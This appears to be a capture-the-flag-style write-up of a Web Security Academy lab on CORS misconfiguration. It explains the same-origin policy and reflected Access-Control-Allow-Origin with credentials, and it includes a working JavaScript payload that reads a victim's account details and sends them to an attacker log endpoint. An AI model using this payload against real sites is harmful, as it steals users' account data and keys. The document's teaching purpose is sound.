# CORS - Cross Origin Resource Sharing

CORS - protocol and header

CORS (Cross-Origin Resource Sharing) is an HTTP-header based security mechanism that allows a server to permit a web page from one origin
(domain, protocol, or port) to access resources from a different origin.

## SOP - Same Origin Policy

same origin policy limits a website to access contents or files outside its particular domain.

CORS is used to relax the SOP in a controlled manner, so websites can able to access resources outside its domain but without causing any issues.



### LAB 1


<img width="637" height="122" alt="Screenshot 2026-10-20 at 22 23 47" src="https://github.com/user-attachments/assets/0de244d7-bcd7-49ad-9ee0-82920187b0e2" />

**```/accountDetails```** - fetches the account details of the user.

**/accountDetails**
<img width="1068" height="294" alt="Screenshot 2026-10-20 at 22 24 27" src="https://github.com/user-attachments/assets/13b09d48-5aeb-4dda-b1d8-cedcf1bb01b4" />

<img width="1005" height="364" alt="Screenshot 2026-10-20 at 22 35 31" src="https://github.com/user-attachments/assets/9b58b7d3-7e7d-4e5d-b7a2-87f21771514a" />

it is reflecting the **```Access-Control-Allow-Origin```** from the **origin** header in the request.

**```Access-Control-Allow-Origin```** - header from server in the response that tells the browser about who all can access this response.
here it is using **```Access-Control-Allow-Credentials```** which is used to tell browser weather to send the sensitive info(like creds or
cookies) to the requested outside source. while using this header the  ```Access-Control-Allow-Origin``` cannot be empty.

so here the server is configured such that it is reflecting the request origin which makes it to vulnerable because it is basically allowing browser to share the server's response with any source.


```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ad5006c03c5512b817d98b6002100b8.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
when this script is run the ```administrator``` browser the request will be sent to the server for his accountDetails and that response will be forwarded to attacker in a form of a request and the data from the server in the parameter value.

